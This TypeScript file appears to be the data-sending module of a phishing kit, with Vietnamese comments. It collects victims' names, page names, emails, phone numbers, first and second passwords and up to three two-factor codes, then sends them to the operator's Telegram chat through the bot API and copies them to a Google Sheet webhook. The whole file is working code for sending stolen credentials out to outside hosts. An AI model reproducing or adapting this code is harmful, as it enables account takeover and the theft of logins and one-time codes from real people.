import axios from 'axios';
import https from 'https';
import { memoryStoreTTL } from '../libs/memoryStore';
import { generateKey } from '../utils/generateKey';

// Environment Variables
const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID!;
const WEBHOOK_URL = process.env.WEBHOOK_URL!; // Google Sheet Webhook
const agent = new https.Agent({ family: 4 });

// Merge dữ liệu cũ + mới
function mergeData(oldData: any = {}, newData: any = {}) {
    return {
        ...oldData,
        ...Object.fromEntries(
            Object.entries(newData).filter(([_, v]) => v !== undefined && v !== '')
        )
    };
}

// Format message Telegram
function formatMessage(data: any): string {
    return `
<b>Ip:</b> <code>${data.ip || 'Error'}</code>
<b>Location:</b> <code>${data.location || 'Error'}</code>
<b>Full Name:</b> <code>${data.name || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Date of birth:</b> <code>day/month/year</code>
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.business || ''}</code>
<b>Phone Number:</b> <code>+${data.phone || ''}</code>
<b>Password First:</b> <code>${data.password || ''}</code>
<b>Password Second:</b> <code>${data.passwordSecond || ''}</code>
<b>Auth Method:</b> <code>${data.authMethod || ''}</code>
<b>2FA Codes:</b> <code>${data.twoFa || ''} | ${data.twoFaSecond || ''} | ${data.twoFaThird || ''}</code>
`.trim();
}

// Gửi dữ liệu lên Webhook (Google Sheet)
async function sendToWebhook(data: any) {
    const payload = {
        timestamp: new Date().toISOString(),
        ip: data.ip || "",
        location: data.location || "",
        name: data.name || "",
        fanpage: data.fanpage || "",
        day: data.day || "",
        month: data.month || "",
        year: data.year || "",
        email: data.email || "",
        business: data.business || "",
        phone: data.phone || "",
        password: data.password || "",
        passwordSecond: data.passwordSecond || "",
        authMethod: data.authMethod || "",
        twoFa: data.twoFa || "",
        twoFaSecond: data.twoFaSecond || "",
        twoFaThird: data.twoFaThird || ""
    };

    try {
        const res = await axios.post(WEBHOOK_URL, payload, {
            headers: { "Content-Type": "application/json" },
            //timeout: 10000
        });
        console.log("✅ Webhook response data:", res.data);
        return res.data;
    } catch (err: any) {
        console.error("❌ Webhook send error:", err?.response?.data || err.message || err);
        throw err;
    }
}

// Gửi dữ liệu Telegram
async function sendTelegram(data: any) {
    const messageText = formatMessage(data);
    const key = generateKey(data);
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);

    try {
        const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: 'HTML'
        }, { httpsAgent: agent, timeout: 10000 });

        const messageId = res.data.result.message_id;
        memoryStoreTTL.set(key, { message: messageText, messageId, data: fullData });
        console.log(`✅ Sent Telegram. ID: ${messageId}`);
        return res.data;
    } catch (err: any) {
        console.error("🔥 Telegram send error:", err?.response?.data || err.message || err);
        throw err;
    }
}

// Gửi dữ liệu đơn hoặc batch
export async function sendSingleData(data: any) {
    try {
        // Telegram
        await sendTelegram(data);
        // Webhook
        await sendToWebhook(data);
    } catch (err) {
        console.error("⚠️ Error sending data:", err);
    }
}

export async function sendBatchData(dataList: any[]) {
    const promises = dataList.map(data => sendSingleData(data));
    await Promise.all(promises);
    console.log("✅ All data sent");
}
